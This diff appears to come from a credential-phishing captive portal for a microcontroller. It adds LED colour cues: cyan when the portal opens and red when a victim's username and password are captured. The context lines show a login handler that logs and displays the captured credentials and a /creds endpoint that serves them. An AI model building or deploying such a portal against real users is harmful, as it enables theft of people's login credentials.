@@ -1,4 +1,5 @@
 #include "web_server.h"
+#include "NeoPixel.h"
 
 void logLoginAttempt(String username, String password);
 
@@ -84,6 +85,7 @@ void WebServer::setUpWebserver(AsyncWebServer &server, IPAddress ip){
     response->addHeader("Cache-Control", "public,max-age=31536000");  // save this file to cache for 1 year (unless you refresh)
     request->send(response);
     Serial.println("Captive Portal Open");
+    NeoPixel::setNeoPixelColour("cyan");
   });
 
   server.on("/login", HTTP_POST, [&server](AsyncWebServerRequest *request) {
@@ -95,6 +97,7 @@ void WebServer::setUpWebserver(AsyncWebServer &server, IPAddress ip){
     Serial.println("captured details " + username + " " + password);
 
     Screen::displayCredsFound(username, password);
+    NeoPixel::setNeoPixelColour("red");
   });
 
   server.on("/creds", HTTP_GET, handleCredsRequest);
